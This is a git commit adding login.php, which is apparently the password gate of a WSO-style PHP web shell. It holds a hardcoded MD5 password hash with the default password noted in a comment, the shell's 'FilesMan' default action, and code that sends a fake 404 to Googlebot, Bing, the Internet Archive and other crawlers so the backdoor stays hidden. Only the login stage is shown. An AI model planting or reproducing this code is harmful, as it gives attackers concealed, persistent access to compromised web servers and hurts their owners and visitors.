73eebd7f737cdc3a3fe311c14419973e38dadb6d
L0LZ666H05T <36075615+l0lz666h05t@users.noreply.github.com>
2018-09-24 20:37:50 +0700

    Create login.php

---
+++ login.php
@@ -0,0 +1,30 @@
+<?php
+$auth_pass = "9ecc19bb81f717d78679c86b3ac6e0b0"; // default: pass huruff
+$color = "#00ff00";
+$default_action = 'FilesMan';
+$default_use_ajax = true;
+$default_charset = 'UTF-8';
+if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
+    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
+    }
+}
+
+function login_shell() {
+?>
+            <center>
+            <form method="post">
+            <input type="password" name="pass">
+            </form>
+            
+<?php
+exit;
+}
+if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
+    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+    else
+        login_shell();
+?>
